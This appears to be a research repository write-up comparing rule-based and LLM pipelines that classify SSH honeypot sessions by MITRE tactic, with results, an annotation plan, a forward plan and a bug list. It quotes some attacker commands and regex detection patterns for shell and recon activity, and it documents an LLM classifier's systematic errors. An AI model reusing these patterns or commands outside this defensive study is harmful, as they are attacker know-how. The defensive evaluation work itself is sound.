| Command and Control | Initial Access | 1,169 | A saw a download-shaped command; B judged the session amounted to just logging in |
| No Action | Initial Access | 885 | Pure vocabulary mismatch — same fact, different name |
| Command and Control | Execution | 358 | Both agree it is serious; they disagree about which kill-chain stage dominates |
| Unknown Activity (Low) | Initial Access | 267 | A has no rule; B falls back to its default |
| Command and Control | Ingress Tool Transfer | 141 | Same concept; B used a technique name where a tactic was required |
| Unknown Activity (High) | Persistence | 124 | **The interesting cell.** A saw complex-but-unmatched commands; B named a specific tactic. Prime H2 evidence |
| Unknown Activity (Low) | Discovery | 114 | Recon commands A has no pattern for |
| No Action | Execution | 74 | B claims real execution where A saw nothing at all |
| Impact | Persistence | 48 | Severity direction disagreement |
| Persistence | Discovery | 35 | B downgrades |
| Execution | Initial Access | 14 | B downgrades sharply |
| Persistence | Defense Evasion | 10 | |
| Resource Hijacking | Impact / Initial Access | 5 / 5 | Mining sessions B did not recognize as mining |

### 9.6 Economics

| Metric | Value |
|---|---|
| Total API cost recorded | **$0.0000** |
| Cost per novel finding | $0.0000 (H4 "PASS" — vacuous) |
| Total agent latency | 344,446.7 s (95.7 h) |
| Mean latency per gated session | 7,779 ms |
| Projected time, 1M sessions | 8.2 h |
| Projected cost, 1M sessions | $0.00 |
| Novel findings | **1,617** (18.3% of analyzed) |
| Rule-based throughput (estimate) | 10,000 sessions/s |

The zeros are an artifact: `gemini_flash_config` sets both price constants to
0.0, so cost accounting was never exercised. Token counts *were* captured per
call, but the aggregated cost was multiplied by zero and the per-call token
counts were not persisted. **Reconstructing true cost requires re-running with a
real price table** — which is exactly what `config/llm_costs.json` in the
forward plan provides.

### 9.7 Sophistication (H5)

| Label | n |
|---|---:|
| SCRIPT_KIDDIE | 7,458 |
| INTERMEDIATE | 877 |
| UNKNOWN | 179 |
| ADVANCED | 0 |
| APT | 0 |

The 179 UNKNOWNs are exactly the residual parse failures. Zero ADVANCED and zero
APT across 8,335 successfully-analyzed sessions is a finding in itself: either
the honeypots genuinely see only commodity automation (plausible — they are
unadvertised sensors catching internet-wide scanning), or the model is
anchoring on the bottom of the scale. **Distinguishing those two explanations
requires ground truth**, and it is a good candidate for a paper subsection.

---

## 10. Reading the results: what the disagreements actually mean

A 41.5% agreement rate looks alarming. Decomposed, it is much less mysterious —
and the decomposition is more interesting than the headline.

### 10.1 Four causes, in descending order of volume

**1. Vocabulary mismatch (largest).** The two pipelines do not share a label
set. Pipeline A can say `No Action`, `Initial Access (Failed)`,
`Unknown Activity (High/Low)`, and `Kill Chain Detected` — none of which are
MITRE tactics. Pipeline B can say `Initial Access` for a successful login and
occasionally emits technique names. The single largest confusion cells
(`Discovery → Initial Access` 1,405, `C2 → Initial Access` 1,169,
`No Action → Initial Access` 885 — 3,459 sessions, **69% of all tactic
disagreements**) are dominated by this. A label-space normalization mapping,
applied before scoring, would move the headline number substantially. Whether to
apply it is a real methodological decision (§17).

**2. Severity-scale mismatch.** Pipeline A's `min(level)` rule plus kill-chain
upgrades give it a near-binary L1/L3 distribution (62 L2 sessions in 11.7M).
Pipeline B spreads across all three. This mechanically produces the 3,500-session
L3→L2 block. Weighted kappa, not raw agreement, is the honest statistic here.

**3. Genuine rule blind spots — the H2 evidence.** 1,617 sessions (18.3%) had
**zero** rule pattern matches yet the agent assigned level ≤ 2. The
`Unknown Activity (High) → Persistence` cell (124) is the cleanest example: the
rules saw complexity they had no pattern for; the agent named a specific tactic.
Worked example from the results file, session `2cc06f64`:

> Command: `/ip cloud print`. Rule label: `Unknown Activity (Low)`. Agent label:
> `Discovery`, confidence 0.9, reasoning: *"specific to MikroTik RouterOS for
> system information discovery… low-sophistication, likely automated
> reconnaissance targeting MikroTik devices."*

No regex in the catalog covers RouterOS syntax. The model recognized a
vendor-specific recon command from general knowledge. **This is the strongest
qualitative argument in the project for the LLM pipeline** — and it is exactly
the class of case a classical ML model on the existing features would also miss,
because the features are Linux-command-shaped.

**4. Silent failure on payload drops.** Session `57bca222`: zero commands, so
Pipeline A returns `No Action` level 3 immediately. The agent read the *upload*
record (`url: "stdin"`) and returned `Initial Access` level 2 with techniques
`T1078.003` + `T1105`, reasoning that credentials were used and a payload was
delivered without any interactive commands. **Pipeline A's early return at
`if not raw_commands` means it never looks at downloads or uploads at all** —
the `has_download`/`has_upload` flags are recorded on the label but never
influence level or tactic. This is a genuine, fixable blind spot in the rule
pipeline, and it is the failure mode the forward plan names "silent FN on stdin
payload drop."

### 10.2 Where Pipeline B is probably wrong

Symmetry matters for credibility. Session `4a6bbd20` is the counter-example:
commands `c`, `ear`, `restart`, `remove boot`, `closs` — every one failed. The
agent assigned level 2, tactic `Initial Access`, techniques including **T1485
(Data Destruction)**, reasoning that `remove boot` showed destructive intent.
A human would likely call this a fumbling, ineffective session — the forward
plan names this failure mode "command typo / failed exec." The agent's
willingness to infer intent from garbage is the mirror image of its ability to
recognize RouterOS syntax.

Add the systematic issues: `Initial Access` used as a 45% default,
`Ingress Tool Transfer` emitted as a tactic 141 times, and a sophistication
distribution that never leaves the bottom two rungs.

### 10.3 The honest summary

Both pipelines have characteristic, *nameable* failure modes:

| Pipeline A fails by | Pipeline B fails by |
|---|---|
| Returning `No Action` on sessions with real payload drops (never inspects downloads/uploads) | Defaulting to `Initial Access` when unsure |
| Having no vocabulary for successful-login-only sessions | Undercalling severity on real activity |
| Missing non-Linux / vendor-specific syntax entirely | Overcalling intent on failed/garbled commands |
| Collapsing to a binary severity scale | Emitting out-of-enum tactic values |
| Firing level-1 `Execution` on any `./` token, including benign paths | Never using the top of its own sophistication scale |

That symmetric table — with per-category counts from the taxonomy work in Phase
6 of the forward plan — is a better paper contribution than any single accuracy
number.

---

## 11. The human annotation program

Specified in `HUMAN_ANNOTATION_PLAN.md`, with all four phases implemented.

### 11.1 Why it exists

Agreement is not accuracy. With 41.5% agreement, at least one pipeline is wrong
on ~59% of comparable sessions and there is no way to say which without an
independent reference. Ground truth converts a *consistency* study into an
*accuracy* study and unlocks precision/recall/F1, significance testing, and the
false-negative analysis the project's advisors specifically asked for.

### 11.2 Sampling design

Target 400 sessions (~±5% margin at 95% confidence for per-cell estimates);
500 if multiple annotators, with the extra 100 as an overlap set for
inter-annotator agreement. Four strata:

**Bucket A — Tactic agreements (~120).** Both pipelines agree; they could still
both be wrong. Quotas by agreed tactic: Discovery 30, C2 20, Initial Access 20,
Impact 15, Execution 10, Persistence 10, other 15.

**Bucket B — Tactic disagreements (~220).** Over-samples the large cells and
guarantees representation of small-but-important ones:

| Rule → Agent | Population | Quota |
|---|---:|---:|
| Discovery → Initial Access | 1,405 | 40 |
| Command and Control → Initial Access | 1,169 | 35 |
| No Action → Initial Access | 885 | 30 |
| Command and Control → Execution | 358 | 25 |
| Unknown Activity (Low) → Initial Access | 267 | 20 |
| Unknown Activity (High) → Persistence | 124 | 15 |
| No Action → Execution | 74 | 10 |
| Impact → Persistence | 48 | 10 |
| Discovery → anything else | ~10 | 10 |
| everything else | — | 25 |

**Bucket C — Novel detections (40).** Zero rule patterns, agent level ≤ 2. The
direct H2 test.

**Bucket D — Level-only disagreements (20).** Tactic agrees, level differs. The
severity-calibration question.

Sessions can qualify for several buckets; deduplication keeps the most specific
(`disagreement > novel > level_only > agreement`), which is why the realized
sample is smaller than the quota sum — the forward plan reports **345 sessions**
actually annotated.

### 11.3 The codebook (`docs/ANNOTATION_CODEBOOK.md`)

Two pages, deliberately opinionated so annotators converge.

**The primary-tactic rule:** when a session spans multiple tactics, pick the
*most advanced/severe* in the kill chain. Discovery → C2 → Execution is labeled
**Execution**. Severity ordering:

> No Action / Unknown → Initial Access → Discovery → Credential Access →
> Command and Control → Execution → Persistence → Privilege Escalation →
> Lateral Movement → Collection → Exfiltration → Impact / Resource Hijacking

**Levels:** 1 = could damage the system or achieve attacker objectives;
2 = establishes persistence or escalates privileges without immediate damage;
3 = recon only or no meaningful action. Level and tactic are orthogonal —
"a session that downloads malware AND executes it is Execution + level 1; a
session that only runs `uname -a` is Discovery + level 3."

**The ambiguity cheatsheet** (the part that actually drives agreement):

| Situation | Ruling |
|---|---|
| Downloaded but never executed | C2, level 2 — the download is the action |
| Download failed (wget errored) | Still C2, level 3 — intent matters, outcome doesn't excuse |
| Ran a script that only does recon | Discovery level 3 — "ran a script" isn't Execution by itself |
| Auth succeeded, typed only garbage | Initial Access, level 3 |
| 200 commands of obvious bot boilerplate | Grade what the bot *did* after the boilerplate |
| `sudo su` that failed | Credential Access, level 2 — the attempt establishes the tactic |
| Everything hit a Cowrie fake response | Irrelevant — grade intent, not whether Cowrie fooled them |
| Ran a miner binary | **Resource Hijacking**, level 1 — not generic Execution |
| Empty session, `auth_success = true` | Initial Access, level 3 |

**The false-negative flag** — check when a security team should not miss this
session. Heuristic: check for any level-1 session, any Persistence/Impact/C2
session, novel-looking commands, signs of targeting, "huh, that's unusual."
Leave unchecked for routine Discovery, failed brute force, and mass-volume IoT
botnet patterns. Explicitly orthogonal to level: a level-2 persistence attempt
can still be high FN-risk.

**Confidence 1–5**, from "effectively guessing" to "certain," with the note that
lots of 1s and 2s is itself a signal worth recording.

**A ten-step decision tree** closes the document, for fast consistent triage.

**Calibration protocol:** with 2+ annotators, do the first 50 sessions together
at one screen, then split. Around session 150, take 50 independently-annotated
overlapping sessions and compute Cohen's kappa. **κ < 0.6 → stop, discuss,
refine the codebook, re-annotate those 50.** Resolve residual disagreements by
majority vote (3+ annotators) or discussion-to-consensus (2), and document which.

### 11.4 Annotation record format

```json
{
  "annotation_id": 42,
  "annotator": "jake",
  "primary_tactic": "Command and Control",
  "threat_level": 2,
  "confidence": 4,
  "is_false_negative_risk": true,
  "notes": "Downloaded a .sh from an IP we've seen before. No execution in-session."
}
```

One file per annotator (`annotation_results_<name>.jsonl`);
`compute_ground_truth_metrics.py` merges them.

### 11.5 What gets computed

Against human ground truth **H**, with Pipeline A = **A** and Pipeline B = **B**:

- Two confusion matrices for tactic (A vs H, B vs H) and two for level. This
  replaces the current A-vs-B matrix, which measures agreement only.
- Per-tactic precision / recall / F1; overall accuracy, macro-F1, weighted-F1.
- Level MAE (levels are ordinal) and linear-weighted kappa.
- **False-negative rate:** of sessions humans flagged as FN-risk, what fraction
  did each pipeline assign level 3 or `No Action`? This is the metric that
  directly answers the advisors' concern, and a pipeline can win on precision
  while losing here — which would make it the worse choice for deployment.
- **McNemar's exact test** on paired tactic correctness.
- **Bootstrap 95% CI** on F1(B) − F1(A), 10,000 resamples.
- **Superiority vs non-inferiority framing.** If the CI is entirely above zero,
  claim superiority. If it straddles zero but its lower bound exceeds −δ
  (default δ = 0.05), claim **non-inferiority** and argue that reasoning,
  adaptability, and novel detections make B valuable even at parity. Which claim
  to make depends on the numbers; both are pre-specified so the choice is not
  post-hoc.
- Inter-annotator kappa (unweighted for tactic, weighted for level) plus percent
  agreement.
- Novel-detection validation: for bucket C, agent-vs-human tactic match rate and
  the fraction humans considered a real threat at all — i.e. Pipeline B's
  value-add *precision*.

### 11.6 Estimated effort

From the plan: re-index ~4–6 h hands-off; pattern analysis ~1 day; sampler
~1 day; codebook ~½ day; interface ½ day to 2 days; **annotation 3–5 days per
person for 400 sessions**; agreement ½ day; resolution ~1 day; final metrics
~1 day; interpretation 1–2 days. **Total roughly 2–3 weeks** for one part-time
annotator.

### 11.7 Current status

An **LLM annotation pass is already complete**: Claude Sonnet 4 over the 345
blind sessions, at `annotation_results_reference.jsonl` on the server (not in
this repo). Human annotation is described as "in progress separately." The
forward plan treats the LLM annotations as usable now and human labels as
arriving later — with the important caveat that using an LLM as the reference
for evaluating an LLM pipeline requires measuring LLM-vs-human agreement before
any accuracy claim rests on it.

---

## 12. The forward plan: cost-stratified multi-pipeline

`IMPLEMENTATION_PLAN (1).md`, written as a self-contained brief for a fresh
agent session. Seven phases.

### Phase 1 — Metrics framework refactor (blocks everything)

Create `src/cowrie_dataset/eval/metrics.py` with: `load_annotations`,
`load_pipeline_labels`, `confusion_matrix(axis="tactic"|"level"|"joint")`,
`per_class_metrics`, `agreement_metrics`, `bootstrap_f1_diff`,
`calibration_curve`, `false_negative_rate`.

Four binding design choices:

1. **Tactic and level are evaluated separately.** Called "the single most
   important refactor." Existing analysis conflates them.
2. **Weighted kappa for level** (ordinal), plain kappa for tactic (nominal).
3. **`No Action` and `Unknown Activity` are first-class classes**, never mapped
   to "no label" — preserving them is the entire point of the silent-failure
   analysis.
4. **Every function takes `dict[session_id → X]`**, never parallel lists.
   Pipelines emit different subsets; aligning by ID is the only correct join.

Acceptance: reproduce the existing tactic confusion matrix cell-for-cell (proves
no regression); confirm the L3→L2 miscalibration appears in the level matrix
while tactic agreement on Discovery is perfect; and a self-comparison sanity
check where F1 difference is exactly 0 with a tight CI.

Artifacts: the module, `tests/test_metrics.py`, and `analysis/baseline_metrics/`
with per-pipeline JSON/Markdown and confusion CSVs.

### Phase 2 — Pipeline C: classical ML

The reviewer-proofing phase. Without it, the paper is "old rules vs new LLMs"
and readers will ask whether basic ML gets most of the gain for a thousandth of
the price.

- **Two training targets:** *C-Human* (on human labels; the headline) and
  *C-Claude* (on the Sonnet 4 annotations; the "LLM-distilled cheap classifier"
  — available now, build first).
- **Do not train on sessions where A and B agree** — that is selection bias onto
  the easy subset.
- Feature module with a fixed, documented ordering persisted to
  `models/feature_schema.json`; explicit median imputation with a recorded
  imputation rate.
- **Two heads:** multi-class classifier for tactic, ordinal regressor for level
  (ordered logistic or regress-then-round). Not one joint classifier — the split
  mirrors Phase 1's evaluation structure.
- LightGBM or XGBoost; 5-fold stratified by tactic **and by sensor** to prevent
  geographic leakage.
- Emits `label_ml` with the same shape as the other pipelines, including
  `confidence` from `predict_proba`.
- **Sanity gates:** top-20 SHAP dump (if one keyword feature dominates, the model
  is degenerate); held-out metrics within ~2 F1 points of CV mean (larger gaps =
  leakage); >95% accuracy on agreement-bucket sessions (these are the easy ones).

### Phase 3 — Pipeline B across models

Run the *identical* Hunter + Analyst prompts through: B-Flash (Gemini 2.5 Flash,
existing baseline), B-Pro (Gemini 2.5 Pro), B-Sonnet, B-Opus, B-GPT, B-Local.
**On the 345-session evaluation sample only** — full-dataset runs are
unnecessary and unaffordable.

Refactor to an `LLMClient` protocol (`complete(prompt, max_tokens, temperature)
→ Response`) with Vertex / Anthropic / OpenAI / Ollama implementations behind a
`make_client(provider, model)` factory. Prompts unchanged. **Regression gate:
re-run B-Flash through the new client and verify byte-equivalent output against
the existing JSONL** — drift means the refactor introduced a bug.

Every call logs to a sidecar: session_id, variant, input/output tokens,
latency_ms, cost_usd, model, stage. Cost comes from a static
`config/llm_costs.json`, updated by hand — no live price fetching. This is what
finally makes the cost axis real (§9.6).

### Phase 4 — Local model variant

The deployability question: SOC teams in regulated or classified environments
cannot send logs to a third-party API. Target hardware is an RTX 5080 (16 GB) —
7–8B at BF16, 12–14B at INT8, ~30B at INT4. Candidates: Qwen 2.5 7B, Llama 3.1
8B, Mistral Nemo 12B, Phi-4 14B, Gemma 2 9B. Selection criterion is
**JSON instruction-following**, since the Analyst stage requires structured
output; smoke-test on 10 sessions before committing to 345.

Ollama first for setup ease, vLLM if throughput is inadequate. Acceptance:
**≥90% JSON parse rate** or the model is unsuitable. Cost is zero; record
latency and, if available, GPU power draw for an energy footnote.

### Phase 5 — Comprehensive evaluation

- **`analysis/headline_table.md`** — the most-referenced artifact. Rows: A,
  B-Flash, B-Pro, B-Sonnet, B-Opus, B-Local, C-Claude, C-Human. Columns: tactic
  accuracy, tactic macro-F1, level MAE, level weighted kappa, false-negative
  rate, $/1000 sessions, median latency.
- **Cost-quality Pareto plot** — log $/1000 sessions vs macro-F1, frontier
  highlighted, dominated pipelines explicitly labeled as dominated.
- **Calibration** — reliability diagrams (10 bins), Brier score, Expected
  Calibration Error, per confidence-emitting pipeline. *"A miscalibrated LLM is
  itself a finding. Don't bury it."*
- **Pairwise McNemar** matrix of p-values on paired tactic correctness.
- **Paired bootstrap CIs** for every pairwise F1 comparison in the paper.
- **Pipeline E (Ensemble)** — majority vote across B-Flash / B-Pro / B-Sonnet,
  ties broken by mean confidence. Essentially free once the runs exist. Report
  it either way; null results are publishable.

### Phase 6 — Failure-mode taxonomy

Cluster the sessions where any pipeline disagrees with truth. Cheap route:
TF-IDF over Pipeline B's reasoning text + KMeans (k = 8–12). Better: sentence
embeddings + HDBSCAN. Sample five sessions per cluster and hand-write a
two-sentence description; those names are the taxonomy.

Expected categories (to verify, not assume):

- Silent FN on stdin payload drop (A says No Action; really C2)
- MikroTik `/system scheduler` exploit (A misses; B catches)
- Command typo / failed exec (A flags Execution L1; truly No Action)
- Severity overcalls on plain recon (B's L3→L2 issue)
- Severity undercalls on credential drops (B's `Initial Access` overuse)

The first three are the "where A fails" story; the last two the "where B fails"
story. **Symmetric reporting is explicitly required.**

### Phase 7 — Reproducibility

`Makefile` with idempotent `train_ml` / `run_b_variants` / `evaluate` /
`paper_artifacts` targets; `requirements.lock`; `data/README.md` describing how
to obtain the dataset or which fields are released;
`analysis/paper_artifacts/` as the sole source for anything appearing in the
paper. *"Nothing goes in the paper unless it's regenerable from this directory."*

### Sequencing

```
Phase 1 (metrics) ─┬─> Phase 2 (Pipeline C)
                   ├─> Phase 3 (multi-LLM) ──> Phase 4 (local LLM)
                   └─> Phase 5 (evaluation)  <── needs all label sources
                          └─> Phase 6 (taxonomy) ──> Phase 7 (reproducibility)
```

Phase 1 blocks everything. Phases 2 and 3 parallelize. Phase 5 onward is strictly
sequential.

### Working-style expectations (stated by the user in the plan)

1. **tmux for anything long-running.** One B variant over 345 sessions is 30–60
   min; a C cross-validation 20+ min. Name the session; record the name.
2. **Confirm at each step.** Run acceptance criteria and report before advancing.
3. **Concise status reports** — numbers and file paths, not narration.
4. **Preserve raw outputs.** New file per run; `_v2` suffix with a documented
   reason if you must rerun.
5. **Surface errors loudly.** Explicitly citing the `max_tokens` incident: every
   parse step logs failure counts and never silently defaults to Unknown.

### Explicit "do not" list

Do not modify A or B classification logic; do not train C on agreement-only
sessions; do not let annotators see pipeline labels; do not run multi-LLM
variants on 11.7M sessions; do not skip Phase 1; do not silently fix upstream
bugs; do not over-engineer — the goal is paper artifacts, not a production
system.

### Definition of done

`analysis/headline_table.md`, `analysis/figures/cost_quality_pareto.png`,
`analysis/failure_taxonomy/categories.md`, `analysis/calibration/`,
`analysis/pairwise_mcnemar_tactic.csv`, and `analysis/paper_artifacts/` — all
regenerable from the Makefile.

---

## 13. Known bugs, limitations, and technical debt

Ordered by impact on published conclusions. Per constraint #1, most of these
should be **documented and worked around, not silently fixed** in Pipeline A/B
classification logic — but several sit outside the frozen pipelines and are
safe to correct.

### 13.1 The H2 number in the disagreement report is a measurement artifact 🔴

`scripts/analyze_disagreements.py` reports
`H2_agent_only_detections = len(agent_only_detections)` where that list is
**capped at `--sample-size` (default 50)** by the guard
`... and len(agent_only_detections) < sample_size`. So the reported "50
agent-only detections (0.6% of dual-labeled)" is just the sample cap.

The correct figure comes from `cost_benefit_analysis.py`, which counts without a
cap: **1,617 novel findings, 18.3%**. H2's stated threshold was >5%, so the
hypothesis passes comfortably — the opposite of what the disagreement report
implies. *Fix: separate the counter from the sample list. Safe to fix; it is
analysis code, not pipeline logic.*

### 13.2 The Hunter's parse fallback biases the filter rate 🔴

`hunter.py::parse_output` searches for `\{[^{}]+\}` — a pattern that cannot
match nested JSON — and on any failure returns **NOISE**. The Analyst received a
proper `_extract_json` (fence-stripping + brace-matching) during error recovery;
**the Hunter never did.**

Every Hunter response that was truncated, fenced-and-nested, or prose-wrapped
was silently counted as NOISE. The 80.1% filter rate (H3) is therefore an upper
bound, and an unknown number of sessions were dropped before analysis. There is
no residual signal in the data to quantify this, because raw Hunter text was not
persisted. *Mitigation: quantify on a re-run by logging raw responses and parse
outcomes; report H3 with the caveat.*

### 13.3 Cost accounting is identically zero 🔴

`gemini_flash_config` sets `input_cost_per_1k = output_cost_per_1k = 0.0`, so
every cost field in `src/cost_report.json` is $0.00 and H4 passes vacuously.
Token counts were returned per call but not persisted, so cost cannot be
reconstructed from existing artifacts. *Fix: the Phase 3 `config/llm_costs.json`
price table plus the per-call sidecar log.*

### 13.4 Elasticsearch document IDs collapse to `session_id` 🔴

`elasticsearch_sink.py::_flush_buffer` builds
`_id = f"{session_id}_{doc['timing']['start_ts']}"`. The master file uses the
**flat** schema with `start_ts` at top level and no `timing` block, so every ID
becomes `"<session_id>_"`.

Cowrie session IDs are short hex strings. With 11.7M sessions the birthday
estimate over an 8-hex-character space is on the order of **10⁴ collisions**,
and the recovery merges observed exactly this (3 duplicates in one subset, 66 in
another). Indexing keyed on session ID alone means colliding sessions **silently
overwrite each other**.

Practical consequences: the annotation plan's expectation of "~11.7M documents"
after re-indexing will not be met; the shortfall is the collision count. *Fix
before re-indexing: `doc.get('timing', {}).get('start_ts') or doc.get('start_ts')`,
or key on `location + session_id + start_ts`. Safe — the sink is not pipeline
classification logic.*

### 13.5 `extract_annotation_sample.py` still reads a nested field 🟠

Commit `94bffb6` flattened `meta`, `timing`, and `authentication` lookups but
left `client = d.get("client") or {}` at
`scripts/extract_annotation_sample.py:166`. With flat input, `client` is absent,
so **every blind record gets `ssh_version: null` and `hassh: null`.**

Annotators therefore cannot see the SSH client fingerprint — a genuinely useful
signal for distinguishing scanners from interactive sessions. *Fix:
`d.get("ssh_version")` / `d.get("hassh")` with the nested lookup as a fallback.
Safe; re-run the sampler and regenerate the blind file.*

### 13.6 Geography never reaches the Analyst 🟠

`analyst.py::format_input` reads `geo.get('country')` and `geo.get('continent')`,
but `geo_features.py` emits `F48_country_name` and `F47_continent_code`. The
prompt therefore always renders `? (?)`. Compounding this, geo enrichment was
almost certainly disabled entirely (no GeoLite2 DB present). *Prompt-level bug —
changing it alters Pipeline B behavior, so treat as documented, not fixed, for
the locked baseline; fix in the Phase 3 variants and note the change.*

### 13.7 No enum validation on Analyst output 🟠

`Ingress Tool Transfer` (technique T1105) appears as a `primary_tactic` 141
times. Nothing validates the value against the twelve-tactic list from the
system prompt. Any evaluation must decide whether to map such values into the
tactic space or score them as errors — a choice that measurably moves Pipeline
B's accuracy. *Document the decision explicitly in the paper.*

### 13.8 Hunter confidence and reasoning are discarded 🟠

`AgentRunner.process` populates `hunter_confidence` and `hunter_reasoning`, but
`AgentPipelineResult.to_dict()` emits only
`{was_anomaly, hunter_verdict, analyst_verdict, pipeline_metrics}`. Both are
dropped before persistence, along with `skipped`, `error`, and `stage`.

Consequences: Hunter confidence from the production run **does not exist** and
cannot be calibrated; skipped sessions are inferable only from
`was_anomaly == false`; the ES mapping and the plan's
`cost_benefit_analysis` ES queries reference `labels_agentic.skipped`, which is
never written. *Fix in `to_dict()`; it is serialization, not classification.*

### 13.9 Field-name drift between the forward plan and the data 🟠

`IMPLEMENTATION_PLAN (1).md` §1.3 specifies a schema that does not match disk:

| Plan says | Data actually has |
|---|---|
| `label_rule` | `labels_rule_based` |
| `label_agent` | `labels_agentic.analyst_verdict` |
| `sensor: "amsterdam"` | `location: "ssh-amsterdam"` |
| `threat_level` | `level` |
| `matched_rules` | `matched_patterns` |
| `label_rule.confidence: "high|medium|low"` | *(no confidence field on Pipeline A at all)* |

Phase 1's loaders must adapt to the real schema. Anyone implementing from the
plan verbatim will produce empty metrics.

### 13.10 The export path holds all sessions in RAM 🟠

`cli.py` export mode does `all_sessions.extend(completed_sessions)` for every
session across every sensor before writing anything. At 11.7M `Session` objects
this is an enormous resident set and is the most likely explanation for the
memory pressure during the run. *Fix: make the export a generator pipeline;
`export_sessions_to_jsonl` already accepts an iterator.*

### 13.11 The agent-pipeline drain loop grows unboundedly 🟠

`run_agent_pipeline.py` only drains completed futures when
`len(pending) >= concurrency * 2`, and removes only those already `done()`. If
completions lag submissions, `pending` grows without bound — each future holding
a full session dict with commands and features. The retry at concurrency 50 was
**OOM-killed at 9,551/27,194 with no error message**, which is consistent with
exactly this. *Fix: bound submissions with a semaphore, or block on
`as_completed` once a high-water mark is reached.*

### 13.12 `docker-compose.yml` healthcheck is syntactically broken 🟡

```yaml
test: ["CMD-SHELL", "curl -s http://localhost:9200/_cluster/health | grep -q 'status]
```

The double-quoted string is never closed and the bracket/quote nesting is wrong;
the file will fail to parse. Also `version: '3.8'` is obsolete in modern Compose.
*Safe to fix — infrastructure, not pipeline.*

### 13.13 Pipeline A ignores downloads and uploads entirely 🟡

`MitreLabeler.label` returns early at `if not raw_commands:` with
`No Action` / `Initial Access (Failed)`, **before** any consideration of
`session.downloads` or `session.uploads`. The `has_download` / `has_upload`
flags are attached to the label but never influence level or tactic.

This is the mechanism behind the `No Action → Initial Access` (885) cell and the
"silent FN on stdin payload drop" failure mode. It is a *finding*, not a bug to
patch — per constraint #1, do not fix it in the frozen baseline. It is a strong
candidate for a "Pipeline A+" ablation in the paper.

### 13.14 Over-broad Discovery and Execution patterns 🟡

Several patterns match far more text than intended:

- `\bfree\b`, `\bdf\b`, `\blast\b`, `\bid\b`, `\bps\b` fire on those words
  appearing anywhere in any command — inflating Discovery.
- `direct_execute` = `\./\S+` matches **any** relative path, so `cat ./notes`
  becomes level-1 Execution.
- `PATTERN_SHELL` = `\bsh(?:ell)?\b` matches a bare `sh` in prose.

Given `min(level)`, the Execution pattern in particular pushes sessions to
level 1 on weak evidence. Again: document as a characterized failure mode
(*"level-1 overcall on incidental `./` tokens"*), do not patch the baseline.

### 13.15 `_classify_unknown` short-circuits on the first long command 🟡

It `return`s `Unknown Activity (High)` as soon as *any* command exceeds 50
characters or contains a metacharacter, without examining the rest — so the
typo/unknown counters below that branch are dead code for most sessions.
Behavioral quirk worth knowing when interpreting the High/Low split.

### 13.16 Rate limiting is per-agent, not per-runner 🟡

`BaseAgent` keeps `_request_times` per instance. A runner holds two agents, so
the aggregate ceiling is **2 × `requests_per_minute`**. At the configured 500
RPM that is up to 1,000 RPM against the API — right at the documented limit the
config comments claim to stay under.

### 13.17 Smaller items 🟢

- `analyze_disagreements.py --es` is a stub that prints "not yet implemented"
  and exits 1.
- `elasticsearch_sink.py` uses `datetime.utcnow()` (deprecated in 3.12) and
  always sets `verify_certs=False`.
- `parse_timestamp` falls back to `datetime.now()` on unparseable input,
  injecting wall-clock times into a historical dataset. Rare, but it would
  produce wild duration values.
- `pyproject.toml` declares `lightgbm`/`scikit-learn` under an `ml` extra that
  is currently unused — Phase 2 will need them.
- `tests/` contains only `__init__.py`. **There are no tests.** Phase 1 requires
  `tests/test_metrics.py` as its first deliverable.
- `README.md` documents only the pre-agent pipeline: it describes "52 features,"
  a single `labels` block, and none of Pipeline B, the anomaly gate, the
  annotation program, or the analysis scripts.
- No `git tag baseline-rules-v1.0` exists despite the plan calling for it as the
  mechanism that freezes the control group.
- `F45_received_size_avg` is an acknowledged proxy (mean input length), not a
  real response size. Do not describe it as a response-size feature in a paper.
- Raw usernames and passwords are stored in features and exports; a data-release
  decision is pending.

### 13.18 Files referenced but absent from the repository

These live on the production server only. Anyone cloning this repo will not find
them:

| Path | What it is |
|---|---|
| `src/labeled_sessions.jsonl` | The 38 GB master dataset |
| `src/sessions_all.jsonl` | 31 GB pre-labeling export — **deleted** |
| `src/anomaly_stats.json` | Trained Welford statistics |
| `annotation_sample_blind.jsonl` / `_full.jsonl` | The 345-session sample |
| `annotation_results_reference.jsonl` | Claude Sonnet 4 annotations |
| `scripts/annotate_with_llm.py` | The LLM annotation script |
| GeoLite2-City.mmdb | Never obtained |

`src/disagreement_results.json` and `src/cost_report.json` **are** committed —
they are the only reproducible evidence of the production run in version control.

---

## 14. Operations runbook

### 14.1 Install

```bash
git clone <repo> && cd cowrie-log-analysis
python -m venv venv && source venv/bin/activate
pip install -e .              # core
pip install -e ".[agents]"    # + anthropic, openai, google-genai
pip install -e ".[ml]"        # + lightgbm, scikit-learn, matplotlib, seaborn
pip install -e ".[dev]"       # + pytest, ipython, jupyter
cp .env.example .env          # then edit
```

### 14.2 Elasticsearch

```bash
sudo sysctl -w vm.max_map_count=262144    # required by ES
cd docker && docker-compose up -d          # ⚠ fix the healthcheck first (§13.12)
# ES → localhost:9200, Kibana → localhost:5601
```

### 14.3 Full pipeline, end to end

```bash
# 0. Smoke test on real data
python scripts/run_mvp_test.py /opt/honeypot/ssh-amsterdam --limit 10 --print

# 1. Export all sensors to flat JSONL  (⚠ high memory, §13.10 — use tmux)
tmux new -s export
python -m cowrie_dataset.cli --all --export src/sessions_all.jsonl

# 2. Validate the schema before anything expensive
python scripts/verify_session_schema.py --input src/sessions_all.jsonl

# 3. Train the anomaly gate
python scripts/train_anomaly_detector.py \
    -i src/sessions_all.jsonl -o src/anomaly_stats.json

# 4. Dry run — confirms the gate rate before spending money
python scripts/run_agent_pipeline.py \
    -i src/sessions_all.jsonl -o /tmp/dry.jsonl \
    --anomaly-stats src/anomaly_stats.json --dry-run --limit 10000

# 5. Real agent run (tmux; hours)
tmux new -s agents
python scripts/run_agent_pipeline.py \
    -i src/sessions_all.jsonl -o src/labeled_sessions.jsonl \
    --anomaly-stats src/anomaly_stats.json --concurrency 50

# 6. Index to Elasticsearch (⚠ fix doc IDs first, §13.4)
tmux new -s reindex
python scripts/index_to_elastic.py \
    -i src/labeled_sessions.jsonl --create-index --delete-index --bulk-size 200

curl -u "$ES_USER:$ES_PASSWORD" \
  "http://192.168.3.130:9200/cowrie-sessions/_count" | jq .

# 7. Analysis
python scripts/analyze_disagreements.py \
    -i src/labeled_sessions.jsonl -o src/disagreement_results.json
python scripts/cost_benefit_analysis.py \
    -i src/labeled_sessions.jsonl -o src/cost_report.json
python scripts/analyze_patterns.py \
    -i src/labeled_sessions.jsonl -o src/pattern_results.json

# 8. Annotation sample
python scripts/extract_annotation_sample.py \
    -i src/labeled_sessions.jsonl --out-dir annotation_out --seed 42

